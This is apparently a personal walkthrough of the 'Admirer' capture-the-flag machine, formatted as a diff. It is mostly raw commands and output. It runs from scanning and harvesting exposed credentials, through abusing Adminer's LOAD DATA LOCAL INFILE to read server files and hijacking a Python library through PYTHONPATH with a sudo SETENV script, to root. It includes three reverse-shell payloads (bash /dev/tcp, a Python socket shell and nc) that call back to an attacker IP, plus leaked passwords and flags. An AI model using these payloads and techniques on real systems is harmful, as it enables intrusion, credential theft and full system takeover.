@@ -1,0 +1,682 @@
+Machine-Name  :  Admirer
+IP-Address    :  10.129.58.222
+
+
+Command-Line: sudo nmap -A 10.129.58.222
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:30 EST
+    Nmap scan report for 10.129.58.222
+    Host is up (0.056s latency).
+    Not shown: 997 closed ports
+    PORT   STATE SERVICE VERSION
+    21/tcp open  ftp     vsftpd 3.0.3
+    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+    |   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+    |_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+    | http-robots.txt: 1 disallowed entry
+    |_/admin-dir
+    |_http-server-header: Apache/2.4.25 (Debian)
+    |_http-title: Admirer
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=12/7%OT=21%CT=1%CU=37439%PV=Y%DS=2%DC=T%G=Y%TM=5FCEBB1
+    OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%TS=8)SEQ(SP=1
+    OS:01%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
+    OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
+    OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
+    OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+    OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+    OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+    OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+    OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+    Network Distance: 2 hops
+    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 1723/tcp)
+    HOP RTT      ADDRESS
+    1   56.60 ms 10.10.14.1
+    2   52.57 ms 10.129.58.222
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds
+
+
+
+Browser:
+Result:
+    User-agent: *
+
+    # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+    Disallow: /admin-dir
+
+
+
+Notes: Possible-USERNAME: "waldo"
+Wappalyzer: Apache. Debian 2.4.25. jQuery 3.4.2. PHP.
+
+
+
+Command-Line: sudo dirb 10.129.58.222
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Dec  7 19:12:20 2020
+    URL_BASE: http://10.129.58.222/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.58.222/ ----
+    ==> DIRECTORY: http://10.129.58.222/assets/
+    ==> DIRECTORY: http://10.129.58.222/images/
+    + http://10.129.58.222/index.php (CODE:200|SIZE:6051)
+    + http://10.129.58.222/robots.txt (CODE:200|SIZE:138)
+    + http://10.129.58.222/server-status (CODE:403|SIZE:277)
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 20 -u http://10.129.58.222
+Result:
+    _|. _ _  _  _  _ _|_    v0.4.0
+    (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-07_18-57-35.log
+
+    Target: http://10.129.58.222/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.58.222/_20-12-07_18-57-36.txt
+
+    [18:57:36] Starting:
+    [18:57:36] 200 -    6KB - /index.php
+    [18:57:36] 403 -  277B  - /images/
+    [18:57:37] 301 -  313B  - /images  ->  http://10.129.58.222/images/
+    [18:57:40] 403 -  277B  - /icons/
+    [18:57:46] 301 -  313B  - /assets  ->  http://10.129.58.222/assets/
+    [18:57:47] 403 -  277B  - /assets/
+    [18:58:09] 200 -  138B  - /robots.txt
+    [19:22:17] 403 -  277B  - /server-status
+    [19:22:17] 403 -  277B  - /server-status/
+
+    Task Completed
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e php,txt -f -t 20 -u http://10.129.58.222
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.0
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 18629
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-07_20-57-11.log
+
+    Target: http://10.129.58.222/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.58.222/_20-12-07_20-57-11.txt
+
+    [20:57:11] Starting:
+    [20:57:12] 403 -  277B  - /.hta.php
+    [20:57:12] 403 -  277B  - /.hta.txt
+    [20:57:12] 403 -  277B  - /.hta/
+    [20:57:12] 403 -  277B  - /.htaccess.php
+    [20:57:12] 403 -  277B  - /.htpasswd.php
+    [20:57:12] 403 -  277B  - /.htpasswd.txt
+    [20:57:25] 301 -  313B  - /assets  ->  http://10.129.58.222/assets/
+    [20:57:25] 403 -  277B  - /assets/
+    [20:57:48] 403 -  277B  - /icons/
+    [20:57:48] 301 -  313B  - /images  ->  http://10.129.58.222/images/
+    [20:57:48] 403 -  277B  - /images/
+    [20:57:49] 200 -    6KB - /index.php
+    [20:57:49] 200 -    6KB - /index.php/
+    [20:58:09] 200 -  138B  - /robots.txt
+    [20:58:11] 403 -  277B  - /server-status/
+    [20:58:11] 403 -  277B  - /server-status
+
+    Task Completed
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -e php,txt -f -t 20 -u http://10.129.58.222/admin-dir
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.0
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 171968
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-07_21-32-52.log
+
+    Target: http://10.129.58.222/admin-dir/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.58.222/.admin-dir_20-12-07_21-32-52.txt
+
+    [21:32:52] Starting:
+    [21:32:53] 403 -  277B  - /admin-dir/.php
+    [21:32:53] 403 -  277B  - /admin-dir/.php/
+    [21:32:53] 403 -  277B  - /admin-dir/.html.txt
+    [21:32:53] 403 -  277B  - /admin-dir/.html.php
+    [21:32:53] 403 -  277B  - /admin-dir/.html
+    [21:32:53] 403 -  277B  - /admin-dir/.html/
+    [21:32:54] 403 -  277B  - /admin-dir/.htm.php
+    [21:32:54] 403 -  277B  - /admin-dir/.htm.txt
+    [21:32:54] 403 -  277B  - /admin-dir/.htm
+    [21:32:54] 403 -  277B  - /admin-dir/.htm/
+    [21:32:58] 200 -  350B  - /admin-dir/contacts.txt
+    [21:33:00] 403 -  277B  - /admin-dir/.
+    [21:33:00] 403 -  277B  - /admin-dir/./
+    [21:33:02] 403 -  277B  - /admin-dir/.htaccess.php
+    [21:33:09] 403 -  277B  - /admin-dir/.php3
+    [21:33:09] 403 -  277B  - /admin-dir/.php3/
+    [21:33:10] 403 -  277B  - /admin-dir/.phtml
+    [21:33:10] 403 -  277B  - /admin-dir/.phtml/
+    [21:33:24] 403 -  277B  - /admin-dir/.htc.php
+    [21:33:24] 403 -  277B  - /admin-dir/.htc.txt
+    [21:33:24] 403 -  277B  - /admin-dir/.htc
+    [21:33:24] 403 -  277B  - /admin-dir/.htc/
+    [21:33:39] 403 -  277B  - /admin-dir/.php5/
+    [21:33:39] 403 -  277B  - /admin-dir/.php5
+    [21:33:55] 403 -  277B  - /admin-dir/.html_var_DE.php
+    [21:33:55] 403 -  277B  - /admin-dir/.html_var_DE/
+    [21:33:55] 403 -  277B  - /admin-dir/.html_var_DE
+    [21:33:55] 403 -  277B  - /admin-dir/.html_var_DE.txt
+    [21:34:00] 403 -  277B  - /admin-dir/.php4/
+    [21:34:00] 403 -  277B  - /admin-dir/.php4
+    [21:34:52] 403 -  277B  - /admin-dir/.htpasswd.php
+    [21:34:52] 403 -  277B  - /admin-dir/.htpasswd.txt
+    [21:35:03] 403 -  277B  - /admin-dir/.html..txt
+    [21:35:03] 403 -  277B  - /admin-dir/.html..php
+    [21:35:03] 403 -  277B  - /admin-dir/.html./
+    [21:35:03] 403 -  277B  - /admin-dir/.html.
+    [21:35:13] 403 -  277B  - /admin-dir/.html.html.php
+    [21:35:13] 403 -  277B  - /admin-dir/.html.html.txt
+    [21:35:13] 403 -  277B  - /admin-dir/.html.html/
+    [21:35:13] 403 -  277B  - /admin-dir/.html.html
+    [21:35:29] 403 -  277B  - /admin-dir/.htpasswds.php
+    [21:35:29] 403 -  277B  - /admin-dir/.htpasswds
+    [21:35:29] 403 -  277B  - /admin-dir/.htpasswds/
+    [21:35:29] 403 -  277B  - /admin-dir/.htpasswds.txt
+    [21:36:05] 403 -  277B  - /admin-dir/.htm..txt
+    [21:36:05] 403 -  277B  - /admin-dir/.htm..php
+    [21:36:05] 403 -  277B  - /admin-dir/.htm.
+    [21:36:05] 403 -  277B  - /admin-dir/.htm./
+    [21:36:14] 403 -  277B  - /admin-dir/.htmll.php
+    [21:36:14] 403 -  277B  - /admin-dir/.htmll.txt
+    [21:36:14] 403 -  277B  - /admin-dir/.htmll
+    [21:36:14] 403 -  277B  - /admin-dir/.htmll/
+    [21:36:14] 403 -  277B  - /admin-dir/.phps/
+    [21:36:14] 403 -  277B  - /admin-dir/.phps
+    [21:36:30] 403 -  277B  - /admin-dir/.html.old.php
+    [21:36:30] 403 -  277B  - /admin-dir/.html.old.txt
+    [21:36:30] 403 -  277B  - /admin-dir/.html.old
+    [21:36:30] 403 -  277B  - /admin-dir/.html.old/
+    [21:36:47] 403 -  277B  - /admin-dir/.ht.php
+    [21:36:47] 403 -  277B  - /admin-dir/.ht
+    [21:36:47] 403 -  277B  - /admin-dir/.ht.txt
+    [21:36:47] 403 -  277B  - /admin-dir/.ht/
+    [21:36:47] 403 -  277B  - /admin-dir/.html.bak.php
+    [21:36:47] 403 -  277B  - /admin-dir/.html.bak
+    [21:36:47] 403 -  277B  - /admin-dir/.html.bak.txt
+    [21:36:47] 403 -  277B  - /admin-dir/.html.bak/
+    [21:36:57] 200 -  136B  - /admin-dir/credentials.txt
+    [21:37:07] 403 -  277B  - /admin-dir/.htm.htm/
+    [21:37:07] 403 -  277B  - /admin-dir/.htm.htm.txt
+    [21:37:07] 403 -  277B  - /admin-dir/.htm.htm
+    [21:37:07] 403 -  277B  - /admin-dir/.htm.htm.php
+    [21:37:56] 403 -  277B  - /admin-dir/.hta.php
+    [21:37:56] 403 -  277B  - /admin-dir/.htgroup.php
+    [21:37:56] 403 -  277B  - /admin-dir/.hta/
+    [21:37:56] 403 -  277B  - /admin-dir/.hta.txt
+    [21:37:56] 403 -  277B  - /admin-dir/.htgroup.txt
+    [21:37:56] 403 -  277B  - /admin-dir/.htgroup/
+    [21:37:56] 403 -  277B  - /admin-dir/.html1.php
+    [21:37:56] 403 -  277B  - /admin-dir/.html1.txt
+    [21:37:56] 403 -  277B  - /admin-dir/.html1/
+    [21:37:56] 403 -  277B  - /admin-dir/.html1
+    [21:38:28] 403 -  277B  - /admin-dir/.html.LCK.php
+    [21:38:28] 403 -  277B  - /admin-dir/.html.LCK.txt
+    [21:38:28] 403 -  277B  - /admin-dir/.html.LCK
+    [21:38:28] 403 -  277B  - /admin-dir/.html.LCK/
+    [21:38:28] 403 -  277B  - /admin-dir/.html.printable.php
+    [21:38:28] 403 -  277B  - /admin-dir/.html.printable
+    [21:38:28] 403 -  277B  - /admin-dir/.html.printable.txt
+    [21:38:28] 403 -  277B  - /admin-dir/.html.printable/
+    [21:39:15] 403 -  277B  - /admin-dir/.htm.LCK
+    [21:39:15] 403 -  277B  - /admin-dir/.htm.LCK.php
+    [21:39:15] 403 -  277B  - /admin-dir/.htm.LCK/
+    [21:39:15] 403 -  277B  - /admin-dir/.htm.LCK.txt
+    [21:40:21] 403 -  277B  - /admin-dir/.htaccess.bak.php
+    [21:40:21] 403 -  277B  - /admin-dir/.htaccess.bak.txt
+    [21:40:21] 403 -  277B  - /admin-dir/.htaccess.bak/
+    [21:40:21] 403 -  277B  - /admin-dir/.html.php.txt
+    [21:40:21] 403 -  277B  - /admin-dir/.html.php.php
+    [21:40:21] 403 -  277B  - /admin-dir/.html.php/
+    [21:40:21] 403 -  277B  - /admin-dir/.htmls.txt
+    [21:40:21] 403 -  277B  - /admin-dir/.htmls.php
+    [21:40:21] 403 -  277B  - /admin-dir/.htmls
+    [21:40:21] 403 -  277B  - /admin-dir/.htx.php
+    [21:40:21] 403 -  277B  - /admin-dir/.htmls/
+    [21:40:21] 403 -  277B  - /admin-dir/.htx.txt
+    [21:40:21] 403 -  277B  - /admin-dir/.htx
+    [21:40:21] 403 -  277B  - /admin-dir/.htx/
+    [21:41:52] 403 -  277B  - /admin-dir/.htlm.php
+    [21:41:52] 403 -  277B  - /admin-dir/.htlm
+    [21:41:52] 403 -  277B  - /admin-dir/.htlm.txt
+    [21:41:52] 403 -  277B  - /admin-dir/.htlm/
+    [21:41:52] 403 -  277B  - /admin-dir/.htm2.php
+    [21:41:52] 403 -  277B  - /admin-dir/.htm2.txt
+    [21:41:52] 403 -  277B  - /admin-dir/.htm2
+    [21:41:52] 403 -  277B  - /admin-dir/.htm2/
+    [21:41:52] 403 -  277B  - /admin-dir/.html-.php
+    [21:41:52] 403 -  277B  - /admin-dir/.html-.txt
+    [21:41:52] 403 -  277B  - /admin-dir/.html-
+    [21:41:52] 403 -  277B  - /admin-dir/.htuser.php
+    [21:41:52] 403 -  277B  - /admin-dir/.html-/
+    [21:41:52] 403 -  277B  - /admin-dir/.htuser.txt
+    [21:41:52] 403 -  277B  - /admin-dir/.htuser
+    [21:41:52] 403 -  277B  - /admin-dir/.htuser/
+
+    Task Completed
+
+
+
+Browser: http://10.129.58.222/admin-dir/contacts.txt
+Result:
+    ##########
+    # admins #
+    ##########
+    # Penny
+    Email: p.wise@admirer.htb
+
+
+    ##############
+    # developers #
+    ##############
+    # Rajesh
+    Email: r.nayyar@admirer.htb
+
+    # Amy
+    Email: a.bialik@admirer.htb
+
+    # Leonard
+    Email: l.galecki@admirer.htb
+
+
+
+    #############
+    # designers #
+    #############
+    # Howard
+    Email: h.helberg@admirer.htb
+
+    # Bernadette
+    Email: b.rauch@admirer.htb
+
+
+
+Browser: http://10.129.58.222/admin-dir/credentials.txt
+Result:
+    [Internal mail account]
+    w.cooper@admirer.htb
+    fgJr6q#S\W:$P
+
+    [FTP account]
+    ftpuser
+    %n?4Wz}R$tTF7
+
+    [Wordpress account]
+    admin
+    w0rdpr3ss01!
+
+
+
+Command-Line: ftp 10.129.58.222
+Username: ftpuser
+Password: %n?4Wz}R$tTF7
+Result: *** LOGIN SUCCESSFUL ***
+
+ftp: ls
+Result:
+    200 PORT command successful. Consider using PASV.
+    150 Here comes the directory listing.
+    -rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
+    -rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
+    226 Directory send OK.
+
+ftp: get dump.sql
+Result:
+    local: dump.sql remote: dump.sql
+    200 PORT command successful. Consider using PASV.
+    150 Opening BINARY mode data connection for dump.sql (3405 bytes).
+    226 Transfer complete.
+    3405 bytes received in 0.00 secs (1.2375 MB/s)
+
+ftp: get html.tar.gz
+Result:
+    local: html.tar.gz remote: html.tar.gz
+    200 PORT command successful. Consider using PASV.
+    150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
+    226 Transfer complete.
+    5270987 bytes received in 21.28 secs (241.9379 kB/s)
+
+Command-Line: mkdir FTP
+Command-Line: mv dump.sql FTP/
+Command-Line: mv html.tar.gz FTP/
+Command-Line: cd HTML-extract
+Command-Line: cat index.php
+Result:
+    $servername = "localhost";
+    $username = "waldo";
+    $password = "]F7jLHw:*G>UPrTo}~A"d6b";
+    $dbname = "admirerdb";
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -e php,txt -f -t 50 -u http://10.129.58.222/utility-scripts
+Result:
+    [00:45:43] 200 -   83KB - /utility-scripts/info.php
+    [00:46:26] 200 -   32B  - /utility-scripts/phptest.php
+    [00:49:14] 200 -    4KB - /utility-scripts/adminer.php
+
+Browser: http://10.129.58.222/utility-scripts/adminer.php
+Result: Database login page.
+
+
+Command-Line: sudo service mysql start
+Command-Line: sudo mysql -u root
+Result:
+    Welcome to the MariaDB monitor.  Commands end with ; or \g.
+    Your MariaDB connection id is 51
+    Server version: 10.3.24-MariaDB-2 Debian buildd-unstable
+
+    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> create database DeleteMeWhenDone;
+Result:
+    Query OK, 1 row affected (0.000 sec)
+
+
+
+MariaDB [(none)]> show databases;
+Result:
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | DeleteMeWhenDone   |
+    | information_schema |
+    | mysql              |
+    | performance_schema |
+    +--------------------+
+    4 rows in set (0.000 sec)
+
+
+MariaDB [(none)]> create user 'uk47'@'10.129.58.222' IDENTIFIED BY 'LolLoluk47uk47!';
+Result:
+    Query OK, 0 rows affected (0.002 sec)
+
+
+MariaDB [(none)]> GRANT ALL on DeleteMeWhenDone.* TO 'uk47'@'10.129.58.222';
+Result:
+    Query OK, 0 rows affected (0.000 sec)
+
+
+MariaDB [(none)]> FLUSH PRIVILEGES;
+Result:
+    Query OK, 0 rows affected (0.000 sec)
+
+
+Command-Line: cd /etc/mysql/mariadb.conf.d/
+*** REMEMBER TO REVERT THIS FILE BACK TO 127.0.0.1 *** "bind-address            = 127.0.0.1"
+Command-Line: sudo nano 50-server.cnf
+Notes: Changed "bind" address to "0.0.0.0"
+
+Command-Line: sudo service mysql stop
+Command-Line: sudo systemctl restart mysql.service
+
+Browser:
+
+Server: 10.10.14.147
+user: uk47
+pass: LolLoluk47uk47!
+database: DeleteMeWhenDone
+
+Notes: Clicked Submit. *** ACCESS GRANTED ***
+
+Found Exploit:
+    Search-Term: Adminer exploit
+    URL: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
+    Search-Term: Adminer LOAD DATA LOCAL
+    URL: https://www.vesiluoma.com/abusing-mysql-clients/
+    Exploit: LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE disobey.test FIELDS TERMINATED BY "\n"
+
+Notes: Need to create a table within DeleteMeWhenDone.
+
+Command-Line: sudo mysql -u root
+MariaDB [(none)]> use DeleteMeWhenDone;
+Result:
+    Database changed
+
+
+MariaDB [DeleteMeWhenDone]> CREATE TABLE vulntable (OUTPUT TEXT(4096));
+Result:
+    Query OK, 0 rows affected (0.012 sec)
+
+Browser: http://10.129.58.222/utility-scripts/adminer.php?server=10.10.14.147&username=uk47&db=DeleteMeWhenDone (Removed the "&sql" appended to the URL)
+Result:
+    Database: DeleteMeWhenDone
+
+
+Notes: Within browser I clicked on "SQL commands" and was redirected.
+
+SQL-Command: LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE vulntable FIELDS TERMINATED BY "\n"
+Result:
+    Query executed OK, 123 rows affected. (0.167 s)
+
+
+Command-Line: sudo mysql -u root
+
+
+MariaDB [(none)]> use DeleteMeWhenDone;
+Result:
+    Reading table information for completion of table and column names
+    You can turn off this feature to get a quicker startup with -A
+
+    Database changed
+    MariaDB [DeleteMeWhenDone]> show tables;
+    +----------------------------+
+    | Tables_in_DeleteMeWhenDone |
+    +----------------------------+
+    | vulntable                  |
+    +----------------------------+
+    1 row in set (0.000 sec)
+
+MariaDB [DeleteMeWhenDone]> select * from vulntable;
+Result:
+|                         $servername = "localhost";                                                                              |
+|                         $username = "waldo";                                                                                    |
+|                         $password = "&<h5b~yK3F#{PaPB&dA}{H>";                                                                  |
+|                         $dbname = "admirerdb";
+
+
+Notes: A new password has been generated for user "waldo".
+
+Command-Line: ssh waldo@10.129.58.222
+Password: &<h5b~yK3F#{PaPB&dA}{H>
+Result:
+    *** USER ACCESS GRANTED ***
+
+waldo@admirer:~$ whoami
+Result:
+    waldo
+
+waldo@admirer:~$ cat user.txt
+Result: 15871b1a1e2bf81384e9478859b0149c
+    *** USER OWNED ***
+
+Notes: Logged into local mysql and deleted DeleteMeWhenDone DB. Changed file 50-server.cnf from 0.0.0.0 to 127.0.0.1.
+
+
+Attempting root access...
+
+waldo@admirer:/$ sudo -l
+Result:
+    Matching Defaults entries for waldo on admirer:
+        env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+
+    User waldo may run the following commands on admirer:
+        (ALL) SETENV: /opt/scripts/admin_tasks.sh
+
+waldo@admirer: cd /var
+waldo@admirer:/var ls
+Result:
+    backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
+
+waldo@admirer:/var cd /backups
+waldo@admirer:/var/backups ls -la
+Result:
+    total 6468
+    drwxr-xr-x  2 root root      4096 Dec  9 02:16 .
+    drwxr-xr-x 12 root root      4096 Nov 29  2019 ..
+    -rw-r--r--  1 root root     40960 Apr 22  2020 alternatives.tar.0
+    -rw-r--r--  1 root root      2156 Nov 29  2019 alternatives.tar.1.gz
+    -rw-r--r--  1 root root     13080 Apr 16  2020 apt.extended_states.0
+    -rw-r--r--  1 root root      1461 Nov 29  2019 apt.extended_states.1.gz
+    -rw-r--r--  1 root root       280 Nov 29  2019 dpkg.diversions.0
+    -rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.1.gz
+    -rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.2.gz
+    -rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.3.gz
+    -rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.4.gz
+    -rw-r--r--  1 root root       218 Nov 29  2019 dpkg.statoverride.0
+    -rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.1.gz
+    -rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.2.gz
+    -rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.3.gz
+    -rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.4.gz
+    -rw-r--r--  1 root root    422248 Apr 16  2020 dpkg.status.0
+    -rw-r--r--  1 root root    128737 Apr 16  2020 dpkg.status.1.gz
+    -rw-r--r--  1 root root    128737 Apr 16  2020 dpkg.status.2.gz
+    -rw-r--r--  1 root root    123388 Dec  1  2019 dpkg.status.3.gz
+    -rw-r--r--  1 root root    122709 Nov 29  2019 dpkg.status.4.gz
+    -rw-------  1 root root       840 Dec  2  2019 group.bak
+    -rw-------  1 root shadow     691 Dec  2  2019 gshadow.bak
+    -rw-r--r--  1 root root   5552679 Dec  4  2019 html.tar.gz
+    -rw-------  1 root root      1680 Dec  2  2019 passwd.bak
+    -rw-------  1 root shadow    1777 Apr 22  2020 shadow.bak
+
+
+waldo@admirer:/var/backups cd /opt/scripts/
+waldo@admirer:/opt/scripts ls -la
+Result:
+    drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
+    drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
+    -rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
+    -rwxr----- 1 root admins  198 Dec  2  2019 backup.py
+
+waldo@admirer:/opt/scripts cat backup.py
+Result:
+    #!/usr/bin/python3
+
+    from shutil import make_archive
+
+    src = '/var/www/html/'
+
+    # old ftp directory, not used anymore
+    #dst = '/srv/ftp/html'
+
+    dst = '/var/backups/html'
+
+    make_archive(dst, 'gztar', src)
+
+
+waldo@admirer:/opt/scripts cd /dev/shm
+waldo@admirer:/dev/shm nano shutils.py
+Write-To-File:
+    import os
+
+    def make_archive(a,b,c):
+        os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.147/9001 0>&1'")
+
+
+Command-Line: nc -nlvp 9001
+Result:
+    listening on [any] 9001 ...
+
+
+Command-Line: sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh
+Result:
+    [[[ System Administration Menu ]]]
+    1) View system uptime
+    2) View logged in users
+    3) View crontab
+    4) Backup passwd file
+    5) Backup shadow file
+    6) Backup web data
+    7) Backup DB
+    8) Quit
+    Choose an option: 6
+    Running backup script in the background, it might take a while...
+    *** FAILED TO CONNECT ***
+
+
+Notes: Changed file-content of /dev/shm/shutils.py.
+New-File-Contents:
+    import socket,subprocess,os
+
+    def make_archive(a,b,c):
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("10.10.14.147",9001))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        p=subprocess.call(["/bin/sh","-i"])
+
+
+waldo@admirer:/dev/shm sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh
+Result: *** FAILED TO CONNECT ***
+
+Command-Line: nc -nlvp 9001
+Result:
+    listening on [any] 9001 ...
+
+Notes: Switching to NetCat. Changing file-contents of /dev/shm/shutils.py
+New-File-Contents:
+    import os
+
+    def make_archive(a,b,c):
+        os.system('nc -c 10.10.14.147 9001')
+
+waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh
+Result:
+    1) View system uptime
+    2) View logged in users
+    3) View crontab
+    4) Backup passwd file
+    5) Backup shadow file
+    6) Backup web data
+    7) Backup DB
+    8) Quit
+    Choose an option: 6
+    Running backup script in the background, it might take a while...
+
+
+Command-Line: listening on [any] 9001 ...
+Result:
+    connect to [10.10.14.147] from (UNKNOWN) [10.129.58.222] 49392
+
+Command-Line: python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    root@admirer:/run/shm#
+
+root@admirer:/run/shm# cat /root/root.txt
+Result: 9494fe92bd72406e5478b2dd96815985
+    *** ROOT OWNED ***
+
+
+*** FINISHED ***
